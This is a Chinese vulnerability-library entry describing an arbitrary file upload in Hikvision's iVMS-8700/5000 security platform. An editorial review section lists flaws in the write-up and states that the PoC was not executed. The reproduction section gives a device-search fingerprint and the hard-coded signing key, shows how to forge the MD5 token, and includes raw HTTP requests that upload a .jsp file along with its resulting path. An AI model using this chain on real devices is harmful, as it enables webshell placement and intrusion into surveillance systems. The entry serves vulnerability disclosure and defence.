---
source: "wy876 漏洞文库"
id: "vw-5af5d2f39ab352651b8cc168"
entity_id: "ve-5af5d2f39ab352651b8cc168"
schema_version: "1"
title: "海康威视iVMS-8700综合安防系统resourceOperations任意文件上传漏洞"
product: "Hikvision iVMS-5000/8700 EPS API"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "token=MD5(完整请求URL+固定key)大写；确切URL规范与构建未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86iVMS-8700%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%B3%BB%E7%BB%9FresourceOperations%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "文中写入/上传步骤会创建或覆盖目标文件；须先核对服务账户写权限、保存路径和脚本解析条件，验证后按原路径核查残留；执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/dxm9gap6g8zry92h"
source_status: "recorded"
previous_fofa_unverified: "web.body="
hunter: "web.body=\"/views/home/file/installPackage.rar\""
---

# 海康威视iVMS-8700综合安防系统resourceOperations任意文件上传漏洞

> 指纹字段校订（2026-10-04）：本文原归档明确标为 Hunter 的完整表达式已记入 `hunter`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Hikvision iVMS-5000/8700 EPS API
- 本文讨论：api/resourceOperations/upload 固定密钥签名绕过及上传
- 版本、权限与配置前提：token=MD5(完整请求URL+固定key)大写；确切URL规范与构建未知
- 资料类型：固定密钥token/上传链；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 首请求Content-Type multipart但正文form-urlencoded不匹配
- 示例token为某目标固化值，需强调重算；MD5是摘要不是加密
- 上传内容1不证明JSP执行或Webshell；响应resourceUuid未展示但提取思路明确
- 与upload.action后台会话路径不同，不能按upload名直接合并
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 文中写入/上传步骤会创建或覆盖目标文件；须先核对服务账户写权限、保存路径和脚本解析条件，验证后按原路径核查残留
- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据

### 待核与来源

- 固定key范围、URL规范化、5000适用性及权限待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
  海康威视iVMS集中监控应用管理平台，是以安全防范业务应用为导向，以视频图像应用为基础手段，综合视频监控、联网报警、智能分析、运维管理等多种安全防范应用系统，构建的多业务应用综合管理平台。攻击者通过获取密钥任意构造token，请求/resourceOperations/upload接口任意上传文件，导致获取服务器webshell权限，同时可远程进行恶意代码执行。

# 二、影响版本
+ 海康威视综合安防系统iVMS-5000
+ 海康威视综合安防系统 iVMS-8700

# 三、资产测绘
+ hunter：`web.body="/views/home/file/installPackage.rar"`


+ 登录页面：


# 四、漏洞复现
1. 访问`<font style="color:rgb(30, 107, 184);">/eps/api/resourceOperations/upload</font>`，发现token需要进行鉴权

```http
POST /eps/api/resourceOperations/upload HTTP/1.1
Host: xx.xx.xx.xx
Accept-Language:zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Content-Type:multipart/form-data;boundary=----WebKitFormBoundaryGEJwjlojPo
Cache-Control:max-age=0
Connection:close
Content-Length: 52

service=http://xx.xx.xx.xx/home/index.action
```


2. 构造token绕过认证（内部机制：如果token值与请求url+secretkey的md5值相同就可以绕过认证）

secretkey是代码里写死的（默认值：secretKeyIbuilding）

token值需要进行MD5加密（32位大写）

组合：token=MD5(url+"secretKeyIbuilding")

```plain
http://xx.xx.xx.xx/eps/api/resourceOperations/uploadsecretKeyIbuilding
```


3. 构造上传文件,上传成功且返回了resourceUuid值

```http
POST /eps/api/resourceOperations/upload?token=DFB0D4034A82263A4DA9A37EB0DA687B HTTP/1.1
Host: xx.xx.xx.xx
Accept-Language:zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Content-Type:multipart/form-data;boundary=----WebKitFormBoundaryGEJwjlojPo
Cache-Control:max-age=0
Connection:close
Content-Length: 178

------WebKitFormBoundaryGEJwjlojPo
Content-Disposition: form-data;name="fileUploader"; filename="test.jsp"
Content-Type: image/jpeg

1
------WebKitFormBoundaryGEJwjlojPo--
```


4. 上传文件位置

```plain
http://xx.xx.xx.xx/eps/upload/resourceUuid的值.jsp
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/dxm9gap6g8zry92h>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
